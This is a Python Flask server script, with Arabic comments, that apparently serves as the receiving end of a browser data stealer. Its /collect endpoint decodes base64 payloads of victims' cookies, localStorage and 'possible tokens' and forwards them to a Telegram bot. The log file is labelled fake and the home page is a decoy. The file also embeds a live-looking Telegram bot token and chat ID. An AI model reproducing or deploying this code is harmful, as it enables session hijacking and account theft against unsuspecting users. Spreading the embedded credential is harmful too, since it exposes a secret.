# server.py
from flask import Flask, request, jsonify
import json, base64, requests, os, hashlib
from datetime import datetime

app = Flask(__name__)

# ===== إعدادات البوت =====
BOT_TOKEN = "8865223524:AAF-iaw7xF614IrEi1kxIYntSfPaccpN6-4"          # من @BotFather
CHAT_ID = "8130482893"          # من /getUpdates
TELEGRAM_URL = f"https://api.telegram.org/bot8865223524:AAF-iaw7xF614IrEi1kxIYntSfPaccpN6-4/sendMessage"

# ===== إرسال إلى تليجرام =====
def send_telegram(text):
    try:
        requests.post(TELEGRAM_URL, data={"chat_id": CHAT_ID, "text": text[:4000]}, timeout=10)
    except:
        pass

# ===== نقطة الاستقبال =====
@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    if not data or 'payload' not in data:
        return jsonify({"status": "error"}), 400

    try:
        decoded = base64.b64decode(data['payload']).decode('utf-8')
        content = json.loads(decoded)
    except:
        content = {"raw": data['payload']}

    # نجهز التقرير
    report = f"""
📥 <b>وصول بيانات جديدة</b>
⏱ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🌐 IP: {request.remote_addr}

🍪 <b>الكوكيز:</b>
<code>{json.dumps(content.get('cookies', {}), indent=2)[:1500]}</code>

💾 <b>التخزين المحلي:</b>
<code>{json.dumps(content.get('localStorage', {}), indent=2)[:1000]}</code>

🔑 <b>التوكنات المحتملة:</b>
<code>{json.dumps(content.get('possibleTokens', {}), indent=2)}</code>

📦 <b>البيانات الخام (مقتطف):</b>
<code>{json.dumps(content, indent=2)[:1500]}</code>
"""
    send_telegram(report)

    # تسجيل في ملف وهمي
    with open("cache.log", "a") as f:
        f.write(f"[{datetime.now()}] {hashlib.md5(report.encode()).hexdigest()}\n")

    return jsonify({"status": "ok"}), 200

# ===== صفحة رئيسية وهمية =====
@app.route('/')
def home():
    return "Service running."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8443, debug=False)
